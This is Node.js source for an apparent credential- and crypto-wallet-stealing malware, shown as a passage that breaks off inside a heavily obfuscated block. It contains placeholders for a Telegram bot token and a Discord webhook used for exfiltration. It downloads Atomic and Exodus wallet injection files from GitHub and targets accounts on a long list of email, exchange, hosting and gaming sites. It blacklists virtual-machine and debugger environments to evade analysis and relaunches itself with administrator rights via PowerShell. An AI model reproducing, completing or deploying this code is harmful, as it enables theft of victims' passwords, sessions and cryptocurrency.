const fs = require('fs');
const fsPromises = fs.promises;
const path = require('path');
const axios = require('axios');
const os = require('os');
const FormData = require('form-data');
const AdmZip = require('adm-zip');
const { spawn, execFileSync, execSync, exec } = require('child_process');
const { promisify } = require('util');
const execPromise = promisify(exec);
const crypto = require('crypto');
const sqlite3 = require('sqlite3');
const util = require('util');
function getLocale() {
    return Intl.DateTimeFormat().resolvedOptions().locale.slice(0, 2).toUpperCase();
}
const computerName = os.hostname();
const local = process.env.LOCALAPPDATA;
const discords = [];
const locale = getLocale();
const mainFolderPath = `C:/ProgramData/Steam/Launcher/${generateRandomString(12)}/${locale}-${computerName}`;
var appdata = process.env.APPDATA, LOCAL = process.env.LOCALAPPDATA, localappdata = process.env.LOCALAPPDATA;
const keywords = ["gmail.com", "live.com", "impots.gouv.fr", "zoho.com", "ameli.fr", "yahoo.com", "tutanota.com", "uber.com", "trashmail.com", "gmx.net", "github.com", "ubereats.com", "safe-mail.net", "thunderbird.net", "mail.lycos.com", "hushmail.com", "mail.aol.com", "icloud.com", "protonmail.com", "fastmail.com", "rackspace.com", "1and1.com", "mailbox.org", "mail.yandex.com", "titan.email", "youtube.com", "nulled.to", "cracked.to", "tiktok.com", "yahoo.com", "gmx.com", "aol.com", "coinbase", "mail.ru", "rambler.ru", "gamesense.pub", "neverlose.cc", "onetap.com", "fatality.win", "vape.gg", "binance", "ogu.gg", "lolz.guru", "xss.is", "g2g.com", "igvault.com", "plati.ru", "minecraft.net", "primordial.dev", "vacban.wtf", "instagram.com", "mail.ee", "hotmail.com", "facebook.com", "vk.ru", "x.synapse.to", "hu2.app", "shoppy.gg", "app.sell", "sellix.io", "gmx.de", "riotgames.com", "mega.nz", "roblox.com", "exploit.in", "breached.to", "v3rmillion.net", "hackforums.net", "0x00sec.org", "unknowncheats.me", "godaddy.com", "accounts.google.com", "aternos.org", "namecheap.com", "hostinger.com", "bluehost.com", "hostgator.com", "siteground.com", "netafraz.com", "iranserver.com", "ionos.com", "whois.com", "te.eg", "vultr.com", "mizbanfa.net", "neti.ee", "osta.ee", "cafe24.com", "wpengine.com", "parspack.com", "cloudways.com", "inmotionhosting.com", "hinet.net", "mihanwebhost.com", "mojang.com", "phoenixnap.com", "dreamhost.com", "rackspace.com", "name.com", "alibabacloud.com", "a2hosting.com", "contabo.com", "xinnet.com", "7ho.st", "hetzner.com", "domain.com", "west.cn", "iranhost.com", "yisu.com", "ovhcloud.com", "000webhost.com", "reg.ru", "lws.fr", "home.pl", "sakura.ne.jp", "matbao.net", "scalacube.com", "telia.ee", "estoxy.com", "zone.ee", "veebimajutus.ee", "beehosting.pro", "core.eu", "wavecom.ee", "iphoster.net", "cspacehostings.com", "zap-hosting.com", "iceline.com", "zaphosting.com", "cubes.com", "chimpanzeehost.com", "fatalityservers.com", "craftandsurvive.com", "mcprohosting.com", "shockbyte.com", "ggservers.com", "scalacube.com", "apexminecrafthosting.com", "nodecraft.com", "sparkedhost.com", "pebblehost.com", "ramshard.com", "linkvertise.com", "adf.ly", "spotify.com", "tv3play.ee", "clarity.tk", "messenger.com", "snapchat.com", "boltfood.eu", "stuudium.com", "steamcommunity.com", "epicgames.com", "greysec.net", "twitter.com", "reddit.com", "amazon.com", "redengine.eu", "eulencheats.com", "4netplayers.com", "velia.net", "bybit.com", "coinbase.com", "ftx.com", "ftx.us", "binance.us", "bitfinex.com", "kraken.com", "bitstamp.net", "bittrex.com", "kucoin.com", "cex.io", "gemini.com", "blockfi.com", "nexo.io", "nordvpn.com", "surfshark.com", "privateinternetaccess.com", "netflix.com", "astolfo.lgbt", "intent.store", "novoline.wtf", "flux.today", "moonx.gg", "novoline.lol", "twitch.tv"];
const atomicInjectionUrl = "https://github.com/doenerium6969/wallet-injection/raw/main/atomic.asar";
const exodusInjectionUrl = "https://github.com/doenerium6969/wallet-injection/raw/main/exodus.asar";

const url = 'BINDER-LINK-HERE';
const botToken = 'YOURBOTTOKEN';
const chatId = 'YOURCHATID';
const discordWebhookUrl = 'REMPLACE_ME';


const blackListedHostname = ["BEE7370C-8C0C-4", "AppOnFly-VPS","tVaUeNrRraoKwa", "vboxuser", "fv-az269-80", "DESKTOP-Z7LUJHJ", "DESKTOP-0HHYPKQ", "DESKTOP-TUAHF5I",  "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", ]
const blackListedUsername = ["WDAGUtilityAccount", "runneradmin", "Abby", "Peter Wilson", "hmarc", "patex", "aAYRAp7xfuo", "JOHN-PC", "FX7767MOR6Q6", "DCVDY", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq", "Lisa", "John", "vboxuser", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "lbeld", "od8m", "Julia", "HEUeRzl", ]
const blackListedGPU = ["Microsoft Remote Display Adapter", "Microsoft Hyper-V Video", "Microsoft Basic Display Adapter", "VMware SVGA 3D", "Standard VGA Graphics Adapter", "NVIDIA GeForce 840M", "NVIDIA GeForce 9400M", "UKBEHH_S", "ASPEED Graphics Family(WDDM)", "H_EDEUEK", "VirtualBox Graphics Adapter", "K9SC88UK", "Стандартный VGA графический адаптер", ]
const blacklistedOS = ["Windows Server 2022 Datacenter", "Windows Server 2019 Standard", "Windows Server 2019 Datacenter", "Windows Server 2016 Standard", "Windows Server 2016 Datacenter"]
const blackListedProcesses = ["watcher.exe", "mitmdump.exe", "mitmproxy.exe", "mitmweb.exe", "Insomnia.exe", "HTTP Toolkit.exe", "Charles.exe", "Postman.exe", "BurpSuiteCommunity.exe", "Fiddler Everywhere.exe", "Fiddler.WebUi.exe", "HTTPDebuggerUI.exe", "HTTPDebuggerSvc.exe", "HTTPDebuggerPro.exe", "x64dbg.exe", "Ida.exe", "Ida64.exe", "Progress Telerik Fiddler Web Debugger.exe", "HTTP Debugger Pro.exe", "Fiddler.exe", "KsDumperClient.exe", "KsDumper.exe", "FolderChangesView.exe", "BinaryNinja.exe", "Cheat Engine 6.8.exe", "Cheat Engine 6.9.exe", "Cheat Engine 7.0.exe", "Cheat Engine 7.1.exe", "Cheat Engine 7.2.exe", "OllyDbg.exe", "Wireshark.exe",];


function hasAdminPrivileges() {
    const testFilePath = path.join(process.env.WINDIR, 'System32', `${generateRandomString(10)}.txt`);
    
    try {
        // Try to write a file in the System32 folder
        fs.writeFileSync(testFilePath, 'test');
        fs.unlinkSync(testFilePath); // Delete the file after testing
        return true;
    } catch (err) {
        return false;
    }
}

// Relaunch the script with administrative privileges
function relaunchAsAdmin() {
    const scriptPath = process.execPath;
    const scriptArgs = process.argv.slice(1).join(' ');
    const command = `powershell -Command "Start-Process '${scriptPath}' -ArgumentList '${scriptArgs}' -Verb RunAs"`;

    console.log('Relaunching the script as administrator...');
    execSync(command, { stdio: 'inherit' });
    process.exit(0);
}

async function main() {
    if (!hasAdminPrivileges()) {
        console.log("The script does not have administrative privileges.");
        relaunchAsAdmin();
    } else {
        function uso_BAZ(){}var dbjKKK,uvkxCFe,et_W0Ki,KqgaezR,hnvJJm,HNEdtaN,scSJyYn,BlK02lo,V_bIZO8,Zrx2R7E,M_ddM8F,fsaOVW,eF09Ag,r4kkaCp,gzF3B5g,DBQpqzk,bn9QXA,EBg8Gjm,MlgAehy,xe8C9rE,Hkp184,w1rSfq,sBTRYWu,IMA4zX,WdKrAs5;function LV8ZUK(uso_BAZ){return dbjKKK[uso_BAZ>-0x45?uso_BAZ>-0x21?uso_BAZ- -0xc:uso_BAZ>-0x45?uso_BAZ- -0x44:uso_BAZ-0x1:uso_BAZ- -0x25]}dbjKKK=acHi9vX();function CsatFo6(uso_BAZ,et_W0Ki){function KqgaezR(uso_BAZ){return dbjKKK[uso_BAZ<-0x9?uso_BAZ- -0x2c:uso_BAZ-0x8]}return uvkxCFe(uso_BAZ,KqgaezR(-0x2c),{'value':et_W0Ki,'configurable':true})}uvkxCFe=Object['defineProperty'];var eRpevH=[],keHiXI=function(dbjKKK,uvkxCFe=0x10,et_W0Ki,KqgaezR=0x23){for(uvkxCFe=uvkxCFe;uvkxCFe%0x4===0x0;uvkxCFe++){uso_BAZ(et_W0Ki=0x0,dbjKKK=dbjKKK.concat(function(){var uvkxCFe;et_W0Ki++;if(et_W0Ki===0x1){return[]}for(uvkxCFe=0x5c;uvkxCFe;uvkxCFe--){dbjKKK.unshift(dbjKKK.pop())}return[]}()))}for(KqgaezR=KqgaezR;KqgaezR;KqgaezR--){dbjKKK.unshift(dbjKKK.pop())}return dbjKKK}(['Gk#zOUh:!x1@}Jh_Ic^p*#_U]','^kJ]OU6oqq~ilf[dn|6l62u','ONd1TFn2vt',',Wg[$jfvuqm<0C$93s(:.Cvv!AT~q/|9D6f','A7@p5zONBChB"dLZaR"M','g)XW]Pq:N|ueJoVJ)7JB23Ox@X1H4$8Kf6^HWA,E]','/gpM`NMv?||)vhusuqfD]2~f','=h^6j+B|Cg;=~wOZ"d>Rh![O','@ZK`AWn_Hg@Dkr,lkRytVNTj#v!Hp/xlBkwDGwu','EW)Imh>E$CqqjFD_dd!]','2oy+z1<7QqR60Nt','`|B:lCh]lcpMfoWE','=D8nN}1_G9AMYL','c7lagU"}D|@46~kcQD/+Yef85g[g^w.E!g/6Y?Ox[6','L{Z8";JKrSIT;Fx96|L','lkz](@*KL6^UhdU"l)6lvgVA@Q;/7hhrV:&vR1Vf','tiw<e#iKX$;bAy"SaC0R7[B@&9','8pwbhgs]Z|y','Q[~l<ru','ag"B6P1RQ53Mb!*EG3wdC/7KTCp#BwCV*9:]}wl}M','_h?pB7+:bg)tDLoNdhO',':sYR3N2gZQGbKMqK9d1[IbWEVT(','kbUn|P%E!^(M[1oBlU9:_P3O','$5kafzt_H>!D#w^8SbYpCA9nnSU!jP*B:9DHI!QxEA[H?L','N5x#[}}:Y>7','JgG#~nI_A9fIddfs_6FpkpKfgznNhA*k','FXRZlC,SM','=_oWaXI|5cY]%PFk{3f','+CDlfU)]b9','MqfDP}b_@zrL1L','f{!<]+u','XF4tG;u','95%WpmVndCZ+vQ6_R|!+|byECC`lpyZco5#ZmnbnR','n7w:,iGckpRAwd(J_qN:e#4WL','IZ8MWrC!C>)?,Qx','NW4D{5!:uq[TUym7)UE}K,[SaCMA"$/Sdsn:X1u','=6s:dw|U3gm4aFc"FX]Rw!9nIYB?SQ+:J9ZBN;vU/S','qZ@p)<A7ZQ/aC/q:]hi=5A?]K>E','siT:sqm|}Ym/[[T"si"Hzz|/F_{T3F=stUL','^p}vxFPPq5BZH1m*','9:p#kH+N3.~lnQdEh6GH@P*vDQl','k|.ZNNiAqqI*HKvr','3cmzP@jWQ5SeYC#JyCcl~','ygODQj&UMSjYvLO_)XbvUihxzx_?LhyP=qBtXqu','X3=+SguK3Ct>KL%~"iO1S','oUgM{zm|^6','>i,BxFVA+x','jC=<5mq:(za:/jzNP5f}sq#|ZqM?mL','+LmbeXenav','=N(t1P]E*Ag$Ij4_vdG[*!aO','lQiaK#"O^q)lJyYB<W}D3NLzXc4q#wx"Cp8Zr7U_Tgp','~XED@h#|=pH4JAu_nk~Rukf8q5B15Pv','E|R#65ESFQ@Y|Q{K)b`8MP,,Kc:cs$hot[HD/+P|L','yiM=dI7U;^qMsJyPd5p#gm9nazr','7iEl557_U_N?aKclscs1}FOx~Xl+^Q`_4gL','8p=+UYzE_q_kMQiJH)E8(rv8]+<YZf','!c1R+e|^d9xk%Fsd','$MWDB@HxlcQcse>cu.?n~jl!e|vy4$xS23UH41VKm^jDO','e3M:w`t_a_SlBL5V87#:iFTj^|U#S$jdPi*M','I/EllhH:`X#5Omt','X6idIF+O','^c<l8p!XO5d','0WpnuAtv3_Q}g!?dVi8B0<,O96}/g[F"BO',')bi=]zvv>Q','tq+noh^bCc?jsJJrn7C:Sjj;RtpHG$PruXY6/P/nc{])YQu:','G$gBg1u','uQ`Rcj%)L|TtL<=r*pz]+zq:{S.?11zE1TYR%C,].S','IBVWQh0|/xeT"J"r1cd1!FM/m^f~=P1Z9qcW+eqO','/9sD(rV7>Xs@hwrK','o5cWGInAVcIocP}Jk6]nF}+:V>JtsJy:;3yt~+/nrS,cO','hL[lri4:6$y[s/XN=:0[(r1b461*jMsd}$u`1ku','~WUZK#9U]x$+;KRsU7M=:wm|:_[#crD_Mi_1Hg`:px81>x6','s>Unu1|v8Q^.QJ/J$71R','%3qH9#~2.S5n/[t','fXwzXz3,$.!Bwd7oO{VD{U*Anp(M6~Wk/>?R;#i|0A*#u','pFxn~<UffX>a=5]_3)"#{jq,s9qU=~hr^HF61<[E=','dr~8a![SiX"F&oZVyc+[k;cOOpK19hOKd7saR+SO','RNZB"H3!%cz_GdKV','XdF[9!9n@z<#XK/K>k?n#Fu','4gN:]<.:Ag`FAylcE)m=S','&>StY"Z,mS1aLhnl,hJ6F"xE2x7Hr1*kNXFl#JE]X9','Gk(b;<4!az@o1h#"nR<vY"R8>pg/8=Rr1>U[]ku','?r3bfj`:bT&U~l$','lr/+%XA_gC~KilCNdUizXz}X`{@4Zfx','DRdDGIXO5>P!YPc7ggAv','>p?6mI>x}c1/=j`rV|Q#hk^K0x9?*e"ZPQ@pmg}:=pZZ*=t','v[{:y?&|69x}iKSkh>5+9<Gca$|xH5%~<3L','vd)HYq.NC$uI0KkKwWm]+ru','XpO8QPbnW|{{j@!S`6rt0IS]DQ!5q/d:4)|tB;`!M','bWc}~wWE}>4@@lyV_XEpzYN]}>5','gio8&X|K>p6W!PNZ_rJn:hxOUC#Om,1J*)/]mJ+](>QW%M','t:p]6?Kf','LM^HEru','Y3Z8sWs,Uq~11M0E?WNasY#Rw|~)0Co)igf','0F%Rnre7sC]i9QrS?Hf}F"p7d$&aef','Y>4zP}en3{iq|Q1Zcd9b3q_/.xL,r1,dShFl>PD8O_','&YWa&`%c_qL?@@<BaYYW?gk|;pb/V/<k','a>(]Q+u','{Wtlo7)S[Q+{3M','KbZnEY<nyY)?K~5Nn|"M','96RnpaTO','ch~lK<!xAc"]*yX)xO','m/FWv+]oR+i/b$1_9pMZENIUtcdclfiJuN.+7,#_]','>F<DsHpA>|aT2o%*{r]nlpD8kq|>O','cX[v~#z]9^8#u','vsk1Ur*A[Qp#mL#d=i(:w!Pnz^91@w0kiu','=)ZBAAIA]',')D76gFFU}T(tOm3"Ainb`NA246"k;K&*X6_1B;J|bcc!PM$',',deD~<{UIvZlHM`P5ZL','Y>;h4kcz@6hafr%~kQOpFe|A(cQ8V[t','qgfaGI0g!S,c0L','qiKIOUAAX9Ti/$mlCp`1e<a!sTdtoM','H3y#tJCE5T])}J=K','cQi=@hg_($?vO','_p(af1AAN5X]?$[d9RN1dHX}g_','9U68%HA8O5"#{/Z:+C[ld7;Et$%awN|d_Q6pVy),2S0XP,|','/RsDw<zNyg,g;F.EhTL','"sib?b7nRtd9PhOZdO','pcop,rZEwp4q9CP_Q_L','VRfllH!q`Ql9b[(SuMnzTJAU%A)?DLSk038H9','m$/BP,cx,5Y/DLEJ"9"MEqa:&T2O`1l:5c`l;!u','@rMt);,]69#N>M','mZXWXUs;_5BF"AaSu_,nxb"]uQ#MjK`r[h@pW/*f','0326paMPM','%3u`v<*bC>p$;K?lwu','z)Q6<YjWaT4/>Pek_pK8r}Abu_.#y[[7cW;nXU#Al>1HPM','a>ERI!}WoAt~#QIlc5i]G,gR7cC@`Fv','r978]gqX}c=9J[WEzXevEN~2_|[KZ<|','=)`8xP8nV>9R{jU7=bjR(pE}i^XT2[=KsROpu2}O','s9GBErA7&C=iSQ>8>gKH!j_nf|5NSfwE4H/M','Xg%vo7sXc_W','[>x+uk!Ogq&^&!"o1r/]+mdbb$BtXP)kKD^6MUzO','{W4zBn_f',':hzni5u','C)#dYqcSV$~L!5@drstl#+lzM','6d[l[iSz@zv}WLqP/LpnG#!XX9','TbWa6#&krxBtiL|d!i@6','!LclwhgU5vd>M"OrakWaG</KE>z@ty~kvN#zBNdKL','RN?HTFzxL5{{{r4ZHZWDQ#kP>5p])f','rQwaTJ5K#gufZ$!KvM^Hv5MK6gtlwdkK','?YCv+AZ,1A)WC$=Z/H;d3Yu','h)naDpt8y$$+0wIdYgYH$#)N}9`','#WZR,rS:eQxl+JQl<Xz]SJmkLXiYYQ1rT[hB*','1Ribry9KVg6lhde"@W/[U/gA#T`kx~5c^6g]@J8|(Yz!u','Xgxbh5B8#gfrFl4PRdSD[mwO','ti.BA5"]t9#NPwqV<WL1sN|K#Y?P.5MZhcM:8,|nYc%a|L','Rb]#`pcz&$8l4A^Pe/2[)nZX4XNlKL','.R8#AWn8iX/{Jy):yhV}OF.O','kby+nm7AEc!/(FCV1u','@HY}]bmKp^N1br5VFXJZQPYi.^jY`~B~Xiwv]wLS(clA2[<9kWJZajY2ocz','<6.tfK1_VclA2[8~J)wv)#NWtvu}aMO|"su`E@[,}c(ggX?k1rTDXa_fuRc','I>=t[l1Ks9D18jz~RMU+W1bKkqVFwJyNq6Hp@j&@V9([$yy~fpMZbJ%clvA','Wpiah#/nJ^j<5w#JNsWvXDZS^z@XJUJT9Qp+uKKisz(Y(~}JlsU+i!/2l><','Xi"#K','_|L:7qMv@zeqZ<.70C@R1b0b)xyCO','K>!b/b)]RS_}3xWEj>Kl$+7U,5.#cyDKKUP:!!:X8_{T3F@d','rrIn$J?O','>WStyz~v~6yn5Lio+Lg+l','iW+63Y(U,5j:65}J"XL','8bQ`DHyxL','z36}s}.EU_.kwd$96D%Rgb6z=','1r@R!?F^v9HvZ$*7fqf}7,;?{|K?Mh27','Qs;h5F4O',']ht}|wB_Oq@v6~#"sWQn&JaWqzC]3~GB%u','+dw=u"?xbC7@FlJZ$O','KU/6nA9PXAQrR=|d8k[WVr6z5g+Zwf1Z/VvRrYdKocW@:M','/>Wba#/ilc[CWJ_7JFdlBCX},QFY+AKVy)Q#j#:ql>HMO','SDwvT!h]t>=,G/OcekWvkN!X}Cv}8[)N','Wp}zZCu','L{v`R?QE+xyake`):UR]?X`ND.c?*ro:6Dhn@h#_}YyoO','hr;b3@kKmpv}m,97Vrc}!FAf','VRr]prPb~_mbnlKEMDnbsYQzw^B?vL~l','NFrnP}U_gQdRKlfccR+M5188Ec/ozMCExi2h:','K:L=:7xz"9L}wdDP;CHRum.,`pmDPL','NL5bT2):Yc;*0,lElbuIqAy,y_sCgrxS/rD6ejF8~|',']XM+Lby:t>^UCe"rC$@[%;oE$Q&PNAx','}W<D4zq:aYV','|i/ZyzQ,j|zHL/R','Nd8MG,h]|gH*rMXV{rV1KCK8A9Ia_<MJ+33nOP6]yz|?O',':p?n}JmnD_@5S$>PVrZHv#LGWS,$_rHoW7jp?hwO1x','hZ$#jJUnw^qY&!v_G"lDp1;]{|0b0,|S$rf','m"^6jJ_v}TOi@51dpiIH(ND8j_VKWeHo','0V~RHPfv"9{NAo&:s:Mtn}*f','~D`WtF(8Z{%4^C6']);et_W0Ki=CsatFo6((...uvkxCFe)=>{function KqgaezR(uvkxCFe){return dbjKKK[uvkxCFe<0x6a?uvkxCFe>0x46?uvkxCFe>0x46?uvkxCFe-0x47:uvkxCFe-0x63:uvkxCFe-0x10:uvkxCFe-0x19]}uso_BAZ(uvkxCFe[KqgaezR(0x47)]=KqgaezR(0x4e),uvkxCFe[KqgaezR(0x49)]=uvkxCFe[KqgaezR(0x5d)]);if(typeof uvkxCFe[LV8ZUK(-0x43)]===LV8ZUK(-0x41)){uvkxCFe[KqgaezR(0x48)]=t3riQu}if(typeof uvkxCFe[KqgaezR(0x49)]===LV8ZUK(-0x41)){uvkxCFe[LV8ZUK(-0x42)]=eRpevH}if(uvkxCFe[LV8ZUK(-0x40)]&&uvkxCFe[KqgaezR(0x48)]!==t3riQu){function hnvJJm(uvkxCFe){return dbjKKK[uvkxCFe<0x9?uvkxCFe- -0x4f:uvkxCFe>0x9?uvkxCFe-0xa:uvkxCFe- -0x3c]}et_W0Ki=t3riQu;return et_W0Ki(uvkxCFe[LV8ZUK(-0x3f)],-hnvJJm(0x10),uvkxCFe[LV8ZUK(-0x40)],uvkxCFe[LV8ZUK(-0x43)],uvkxCFe[LV8ZUK(-0x42)])}if(uvkxCFe[LV8ZUK(-0x3f)]!==uvkxCFe[KqgaezR(0x4d)]){function HNEdtaN(uvkxCFe){return dbjKKK[uvkxCFe<-0x8?uvkxCFe-0x5:uvkxCFe- -0x7]}return uvkxCFe[KqgaezR(0x49)][uvkxCFe[KqgaezR(0x4c)]]||(uvkxCFe[HNEdtaN(-0x5)][uvkxCFe[LV8ZUK(-0x3f)]]=uvkxCFe[KqgaezR(0x48)](keHiXI[uvkxCFe[LV8ZUK(-0x3f)]]))}if(uvkxCFe[LV8ZUK(-0x43)]===et_W0Ki){t3riQu=uvkxCFe[KqgaezR(0x4d)];return t3riQu(uvkxCFe[KqgaezR(0x4b)])}if(uvkxCFe[LV8ZUK(-0x40)]==uvkxCFe[LV8ZUK(-0x43)]){function scSJyYn(uvkxCFe){return dbjKKK[uvkxCFe<-0x2e?uvkxCFe>-0x2e?uvkxCFe- -0x28:uvkxCFe- -0x51:uvkxCFe- -0x52]}return uvkxCFe[KqgaezR(0x4d)]?uvkxCFe[LV8ZUK(-0x3f)][uvkxCFe[scSJyYn(-0x4f)][uvkxCFe[LV8ZUK(-0x3e)]]]:eRpevH[uvkxCFe[KqgaezR(0x4c)]]||(uvkxCFe[KqgaezR(0x4b)]=uvkxCFe[scSJyYn(-0x4f)][uvkxCFe[LV8ZUK(-0x3f)]]||uvkxCFe[scSJyYn(-0x50)],eRpevH[uvkxCFe[scSJyYn(-0x4c)]]=uvkxCFe[LV8ZUK(-0x40)](keHiXI[uvkxCFe[scSJyYn(-0x4c)]]))}},LV8ZUK(-0x3d));function ge8FqtJ(){return globalThis}function R1rUqR(){return global}function roRtNk(){return window}function YJ2X6j(){return new Function('return this')()}function tbcDIS(uvkxCFe=[ge8FqtJ,R1rUqR,roRtNk,YJ2X6j],et_W0Ki,KqgaezR=[],hnvJJm,HNEdtaN){function scSJyYn(uvkxCFe){return dbjKKK[uvkxCFe>-0x39?uvkxCFe- -0x11:uvkxCFe>-0x39?uvkxCFe- -0x35:uvkxCFe>-0x5d?uvkxCFe>-0x5d?uvkxCFe- -0x5c:uvkxCFe-0x25:uvkxCFe-0x5d]}et_W0Ki=et_W0Ki;try{uso_BAZ(et_W0Ki=Object,KqgaezR[LV8ZUK(-0x36)](''['__proto__']['constructor']['name']))}catch(e){}U8jBz2_:for(hnvJJm=scSJyYn(-0x57);hnvJJm<uvkxCFe[LV8ZUK(-0x44)];hnvJJm++){try{function BlK02lo(uvkxCFe){return dbjKKK[uvkxCFe>-0xc?uvkxCFe- -0x5a:uvkxCFe- -0x2f]}et_W0Ki=uvkxCFe[hnvJJm]();for(HNEdtaN=BlK02lo(-0x2a);HNEdtaN<KqgaezR[LV8ZUK(-0x44)];HNEdtaN++){if(typeof et_W0Ki[KqgaezR[HNEdtaN]]===BlK02lo(-0x2c))continue U8jBz2_}return et_W0Ki}catch(e){}}return et_W0Ki||this}uso_BAZ(KqgaezR=tbcDIS()||{},hnvJJm=KqgaezR['TextDecoder'],HNEdtaN=KqgaezR['Uint8Array'],scSJyYn=KqgaezR['Buffer'],BlK02lo=KqgaezR['String']||String,V_bIZO8=KqgaezR['Array']||Array,Zrx2R7E=function(){var uvkxCFe,et_W0Ki,KqgaezR;function hnvJJm(uvkxCFe){return dbjKKK[uvkxCFe<0x61?uvkxCFe- -0x17:uvkxCFe-0x62]}uso_BAZ(uvkxCFe=new V_bIZO8(hnvJJm(0x7c)),et_W0Ki=BlK02lo[LV8ZUK(-0x38)]||BlK02lo['fromCharCode'],KqgaezR=[]);return CsatFo6(function(...hnvJJm){var HNEdtaN;function scSJyYn(hnvJJm){return dbjKKK[hnvJJm<-0x21?hnvJJm-0xc:hnvJJm>-0x21?hnvJJm- -0x20:hnvJJm-0x59]}uso_BAZ(hnvJJm[LV8ZUK(-0x44)]=LV8ZUK(-0x3e),hnvJJm[LV8ZUK(-0x3c)]=-0x62);var V_bIZO8,Zrx2R7E;uso_BAZ(hnvJJm[hnvJJm[LV8ZUK(-0x3c)]- -0xeb]=LV8ZUK(-0x3b),hnvJJm[LV8ZUK(-0x43)]=hnvJJm[LV8ZUK(-0x3f)][LV8ZUK(-0x44)],KqgaezR[LV8ZUK(-0x44)]=scSJyYn(-0x1b));for(HNEdtaN=scSJyYn(-0x1b);HNEdtaN<hnvJJm[scSJyYn(-0x1f)];){function M_ddM8F(hnvJJm){return dbjKKK[hnvJJm<0x4d?hnvJJm-0x2d:hnvJJm<0x4d?hnvJJm-0x58:hnvJJm-0x4e]}Zrx2R7E=hnvJJm[hnvJJm[scSJyYn(-0x18)]-scSJyYn(-0x17)][HNEdtaN++];if(Zrx2R7E<=hnvJJm[hnvJJm[scSJyYn(-0x18)]- -0x39]- -0x2f){V_bIZO8=Zrx2R7E}else if(Zrx2R7E<=0xdf){V_bIZO8=(Zrx2R7E&0x1f)<<scSJyYn(-0x15)|hnvJJm[LV8ZUK(-0x3f)][HNEdtaN++]&scSJyYn(-0x16)}else if(Zrx2R7E<=0xef){function fsaOVW(hnvJJm){return dbjKKK[hnvJJm>0x29?hnvJJm<0x4d?hnvJJm<0x4d?hnvJJm<0x4d?hnvJJm-0x2a:hnvJJm-0x30:hnvJJm- -0x55:hnvJJm- -0x4d:hnvJJm- -0x1c]}V_bIZO8=(Zrx2R7E&hnvJJm[fsaOVW(0x32)]-(hnvJJm[fsaOVW(0x32)]-LV8ZUK(-0x32)))<<LV8ZUK(-0x37)|(hnvJJm[fsaOVW(0x2f)][HNEdtaN++]&fsaOVW(0x34))<<LV8ZUK(-0x39)|hnvJJm[hnvJJm[LV8ZUK(-0x3c)]-scSJyYn(-0x17)][HNEdtaN++]&scSJyYn(-0x16)}else if(BlK02lo[M_ddM8F(0x5a)]){function eF09Ag(hnvJJm){return dbjKKK[hnvJJm>0x5c?hnvJJm-0x30:hnvJJm<0x5c?hnvJJm>0x5c?hnvJJm-0x47:hnvJJm-0x39:hnvJJm-0x36]}V_bIZO8=(Zrx2R7E&eF09Ag(0x5b))<<0x12|(hnvJJm[eF09Ag(0x3e)][HNEdtaN++]&hnvJJm[eF09Ag(0x41)]-0x11)<<eF09Ag(0x46)|(hnvJJm[hnvJJm[eF09Ag(0x41)]-M_ddM8F(0x57)][HNEdtaN++]&eF09Ag(0x43))<<M_ddM8F(0x59)|hnvJJm[scSJyYn(-0x1b)][HNEdtaN++]&scSJyYn(-0x16)}else{function r4kkaCp(hnvJJm){return dbjKKK[hnvJJm<0x17?hnvJJm-0x1f:hnvJJm-0x18]}uso_BAZ(V_bIZO8=r4kkaCp(0x22),HNEdtaN+=hnvJJm[LV8ZUK(-0x3c)]-LV8ZUK(-0x30))}KqgaezR[M_ddM8F(0x5c)](uvkxCFe[V_bIZO8]||(uvkxCFe[V_bIZO8]=et_W0Ki(V_bIZO8)))}if(hnvJJm[scSJyYn(-0x18)]>0xaa){return hnvJJm[-0x73]}else{return KqgaezR['join']('')}},hnvJJm(0x68))}(),CsatFo6(l1LkRA,LV8ZUK(-0x3e)));function l1LkRA(...uvkxCFe){function et_W0Ki(uvkxCFe){return dbjKKK[uvkxCFe>0x52?uvkxCFe- -0x52:uvkxCFe-0x2f]}uso_BAZ(uvkxCFe[LV8ZUK(-0x44)]=LV8ZUK(-0x3e),uvkxCFe[et_W0Ki(0x3e)]=uvkxCFe[et_W0Ki(0x34)]);if(typeof hnvJJm!==LV8ZUK(-0x41)&&hnvJJm){return new hnvJJm()['decode'](new HNEdtaN(uvkxCFe[LV8ZUK(-0x35)]))}else if(typeof scSJyYn!==et_W0Ki(0x32)&&scSJyYn){return scSJyYn['from'](uvkxCFe[et_W0Ki(0x3e)])['toString']('utf-8')}else{return Zrx2R7E(uvkxCFe[LV8ZUK(-0x35)])}}uso_BAZ(M_ddM8F=et_W0Ki(0xa0),fsaOVW=et_W0Ki[LV8ZUK(-0x33)](LV8ZUK(-0x34),0x99),eF09Ag=et_W0Ki(0x60),r4kkaCp=et_W0Ki(0x5c),gzF3B5g=et_W0Ki(0x54),DBQpqzk=et_W0Ki(0x49),bn9QXA=et_W0Ki[LV8ZUK(-0x31)](LV8ZUK(-0x34),[0x3e]),EBg8Gjm=et_W0Ki(0x36),MlgAehy=et_W0Ki(0x2e),xe8C9rE=et_W0Ki(0x22),Hkp184=et_W0Ki(0x20),w1rSfq=et_W0Ki(0x1a),sBTRYWu=[et_W0Ki(0xb),et_W0Ki[LV8ZUK(-0x33)](LV8ZUK(-0x34),LV8ZUK(-0x25)),et_W0Ki[LV8ZUK(-0x33)](LV8ZUK(-0x34),LV8ZUK(-0x32)),et_W0Ki[LV8ZUK(-0x33)](LV8ZUK(-0x34),0x14),et_W0Ki(0x18),et_W0Ki(0x19),et_W0Ki[LV8ZUK(-0x31)](LV8ZUK(-0x34),[0x1e]),et_W0Ki[LV8ZUK(-0x33)](LV8ZUK(-0x34),0x25),et_W0Ki(0x27),et_W0Ki(0x2c),et_W0Ki(0x35),et_W0Ki(0x3a),et_W0Ki(LV8ZUK(-0x3a)),et_W0Ki(0x41),et_W0Ki(0x48),et_W0Ki(0x4c),et_W0Ki(LV